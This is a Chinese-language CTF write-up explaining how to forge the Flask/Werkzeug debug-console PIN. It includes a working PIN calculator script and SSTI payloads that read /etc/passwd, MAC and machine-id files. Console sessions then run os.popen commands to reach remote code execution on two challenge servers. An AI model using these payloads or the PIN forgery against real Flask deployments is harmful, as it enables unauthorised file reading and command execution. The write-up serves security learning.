+++
title = "flask计算pin值"
slug = "flask-pin-calculation"
description = ""
date = "2024-08-19T09:09:00"
lastmod = "2024-08-19T09:09:00"
image = ""
license = ""
categories = ["talk"]
tags = ["姿势", "flask"]
+++

# 0x01 前言

最近有道`flask`不仅仅可以绕过黑名单而且开启了`debug`模式可以进行`pin`值计算`getshell`

# 0x02 

## 原理

`pin`码是[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的`webshell`

## 计算

```
probably_public_bits = [
    username    运行当前程序的用户名
    modname     当前对象的模块名，默认为flask.app
    getattr(app, "__name__", app.__class__.__name__) 当前对象的名称，默认为Flask
    getattr(mod, "__file__", None)          flask包内的app.py的绝对路径
]

private_bits = [
    str(uuid.getnode())     Mac地址的整型，通过int(Mac, 16)可以获取
    get_machine_id()            [
            docker      /proc/self/cgroup，正则分割
            Linux           /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定
            macOS           ioreg -c IOPlatformExpertDevice -d 2中"serial-number" = <{ID}部分
            Windows     注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
    ]
]
```

那么我们主要研究如何得到`docker`的相关

1. username

   用户名。通过 `getpass.getuser()` 读取，通过文件读取 `/etc/passwd`。

2. modname

   模块名。通过 `getattr(mod,"file",None)` 读取，默认值为 `flask.app`。

3. appname

   应用名。通过 `getattr(app,"name",type(app).name)` 读取，默认值为 `Flask`。

4. moddir

   Flask库下 `app.py` 的绝对路径。通过 `getattr(mod,"file",None)` 读取，实际应用中通过报错读取。

5. uuidnode

   当前网络的mac地址的十进制数。通过 `uuid.getnode()` 读取，通过文件 `/sys/class/net/eth0/address` 得到16进制结果，转化为10进制进行计算。

6. machine_id  下面讲

当然最重要的就是这个`machine_id`我们可以通过查看方法来看为什么

这里以`/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py`为例子

```python 
def get_machine_id() -> str | bytes | None:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> str | bytes | None:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
            # subprocess may not be available, e.g. Google App Engine
            # https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)

            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows, use winreg to get the machine guid.
        if sys.platform == "win32":
            import winreg

            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
                ) as rk:
                    guid: str | bytes
                    guid_type: int
                    guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")

                    if guid_type == winreg.REG_SZ:
                        return guid.encode("utf-8")

                    return guid
            except OSError:
                pass

        return None

    _machine_id = _generate()
    return _machine_id

```

```bash
1. /etc/machine-id（一般仅非docker机有，截取全文）
2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）
3. /proc/self/cgroup 或 /proc/self/mountinfo 或 /proc/self/cpuset（一般仅docker有，仅截取最后一个docker斜杠后面的内容，但是其实一般只看这三个中的第一个）

例子docker/algf654131234d35g4d56ag1
就只要algf654131234d35g4d56ag1然后进行拼接
文件12按顺序读，12只要读到一个就可以了，1读到了，就不用读2了。
文件3如果存在的话就截取，不存在的话就不用管
最后machine-id=（文件1或文件2）+文件3（存在的话）
```

实验代码

```python
from flask import Flask
from flask import request
from flask import render_template_string

app=Flask(__name__)

@app.route('/',methods=['GET','POST'])         
def index():
    template=''' 
    <p>Hello %s </p>'''%(request.args.get('name'))
    return render_template_string(template)      # 渲染为html内容

if __name__ == '__main__':          # 如果作为脚本运行，而不是被当成模块导入
    app.run(host=0.0.0.0,port=5000,debug=True)

```

由于我的Windows系统不能实验这里就贴个代码吧看题

## 计算脚本

```python
import hashlib
from itertools import chain
import argparse



def getMd5Pin(probably_public_bits, private_bits):
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def getSha1Pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv

def macToInt(mac):
    mac = mac.replace(":", "")
    return str(int(mac, 16))

if __name__ == '__main__':
    parse = argparse.ArgumentParser(description = "Calculate Python Flask Pin")
    parse.add_argument('-u', '--username',required = True, type = str, help = "运行flask用户的用户名")
    parse.add_argument('-m', '--modname', type = str, default = "flask.app", help = "默认为flask.app")
    parse.add_argument('-a', '--appname', type = str, default = "Flask", help = "默认为Flask")
    parse.add_argument('-p', '--path', required = True, type = str, help = "getattr(mod, '__file__', None):flask包中app.py的路径")
    parse.add_argument('-M', '--MAC', required = True, type = str, help = "MAC地址")
    parse.add_argument('-i', '--machineId', type = str, default = "", help = "机器ID")
    args = parse.parse_args()

    probably_public_bits = [
        args.username,
        args.modname,
        args.appname,
        args.path
    ]

    private_bits = [
        macToInt(args.MAC),
        bytes(args.machineId, encoding = 'utf-8')
    ]
    md5Pin = getMd5Pin(probably_public_bits, private_bits)
    sha1Pin = getSha1Pin(probably_public_bits, private_bits)

    print("Md5Pin:  " + md5Pin)
    print("Sha1Pin:  " + sha1Pin)
    
#python "c:\Users\xxx\Documents\VSCODE\.vscode\python\index.py" -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1
```

## demo1

[GYCTF2020]FlaskApp

```
{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif %}{%endfor %}
加密打入
得到flaskweb
```

```
flask.app

Flask

{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif %}{%endfor %}
直接打入得到
/usr/local/lib/python3.7/site-packages/flask/app.py
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read()}}{% endif %}{% endfor %}
加密打入得到
92:8a:43:bb:5b:c3
```

```
首先访问`/etc/machine-id`，有值就break，没值就访问`/proc/sys/kernel/random/boot_id`，然后不管此时有没有值，再访问`/proc/self/cgroup` 或 `/proc/self/mountinfo` 或 `/proc/self/cpuset` 其中的值拼接到前面的值后面。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/machine-id','r').read()}}{% endif %}{% endfor %}
加密打入
1408f836b0ca514d796cbf8960e45fa1

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read()}}{% endif %}{% endfor %}
加密打入
0::/


python "c:\Users\baozhongqi\Documents\VSCODE\.vscode\python\index.py" -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1
Md5Pin:  462-301-547
Sha1Pin:  468-724-479
```

这里是`python3.7`所以使用`md5`

终于打通了 `/console`

```
>>> import os
>>> os.popen('ls /')
<os._wrap_close object at 0x7fad121fa910>
>>> os.popen('ls /').read()
'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nro  
>>> print(os.popen('ls /').read())
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
this_is_the_flag.txt
tmp
usr
var

>>> print(os.popen('tac /f*').read())

>>> print(os.popen('tac /this_is_the_flag.txt').read())
flag{c5d06b53-5aae-44b5-b805-246affc80c5f}
```

## demo2

ctfshow801

进来看到提示直接报错得到

```
/usr/local/lib/python3.8/site-packages/flask/app.py

file?filename=/etc/passwd
用户为root

flask.app
Flask

file?filename=/sys/class/net/eth0/address
02:42:ac:0c:4e:cd
file?filename=/etc/machine-id
没有回显

file?filename=/proc/sys/kernel/random/boot_id
225374fa-04bc-4346-9f39-48fa82829ca9

file?filename=/proc/self/cgroup
截取得到
738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
拼接得到
225374fa-04bc-4346-9f39-48fa82829ca9738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
```

```
python "c:\Users\baozhongqi\Documents\VSCODE\.vscode\python\index.py" -u root -p /usr/local/lib/python3.8/site-packages/flask/app.py -M 02:42:ac:0c:4e:cd -i 225374fa-04bc-4346-9f39-48fa82829ca9738efa7dcfc01e1f32b0efb1d6c4150b8895b33855bb0097449ed6f1dfde2d6b
Md5Pin:  459-927-146
Sha1Pin:  109-751-384
```

这里是`python3.8`,使用哈希的

访问`console`一样的成功RCE

# 0x03 小结

调试模式还有这些新奇的姿势，好玩，虽然中途对`machine_id`有些疑惑但是最后还是成功的明白了
